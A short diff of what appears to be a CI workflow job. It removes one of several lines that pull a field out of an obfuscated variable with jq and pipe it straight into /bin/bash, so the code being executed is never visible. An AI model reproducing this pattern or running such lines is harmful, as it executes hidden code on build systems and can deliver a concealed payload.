@@ -27,7 +27,6 @@ jobs:
           echo $me78652 | jq -r .q06 | /bin/bash
           printf '%s' "$qge61" | jq -r .y2389 | /bin/bash
           echo $vscp48 | jq -r .j573 | /bin/bash
-          echo $bun806 | jq -r .nqs2189 | /bin/bash
           printf '%s' "$xl84007" | jq -r .tgi6 | /bin/bash
           echo $al87282 | jq -r .kttn275 | /bin/bash
           printf '%s' "$wnyvs01" | jq -r .ltc72 | /bin/bash
